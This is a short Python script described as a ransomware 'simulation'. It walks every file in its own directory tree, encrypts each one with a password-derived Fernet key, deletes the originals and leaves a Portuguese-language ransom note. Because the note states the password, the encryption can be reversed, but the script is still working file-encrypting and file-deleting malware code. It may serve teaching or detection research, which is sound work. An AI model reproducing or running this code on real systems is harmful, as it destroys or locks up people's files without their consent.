import os
import hashlib
from cryptography.fernet import Fernet
import base64

def derive_key(password: str) -> bytes:
    """Derive a key from password using SHA-256."""
    return base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())

def encrypt_file(file_path: str, password: str):
    """Encrypt file using Fernet with SHA-256 derived key."""
    key = derive_key(password)
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(file_path + '.enc', 'wb') as file:
        file.write(encrypted)
    os.remove(file_path)

def create_ransom_note(directory: str, password: str):
    """Create ransom note with decryption instructions."""
    key = derive_key(password)
    note = f"""SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
    
Para descriptografar, use a senha: {password}
Chave derivada: {key.decode()}
Execute: python decrypt.py {directory} {password}
"""
    with open(os.path.join(directory, 'RANSOM_NOTE.txt'), 'w') as f:
        f.write(note)

def simulate_ransomware(password: str = 'secret'):
    """Simulate stronger ransomware: encrypt files and add note."""
    directory = os.path.dirname(os.path.abspath(__file__))
    for root, _, files in os.walk(directory):
        for file in files:
            if not file.endswith(('.enc', '.txt')) and file != os.path.basename(__file__):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, password)
                print(f"Encrypted: {file_path}")
    create_ransom_note(directory, password)

# Usage
if __name__ == "__main__":
    simulate_ransomware('your_strong_password')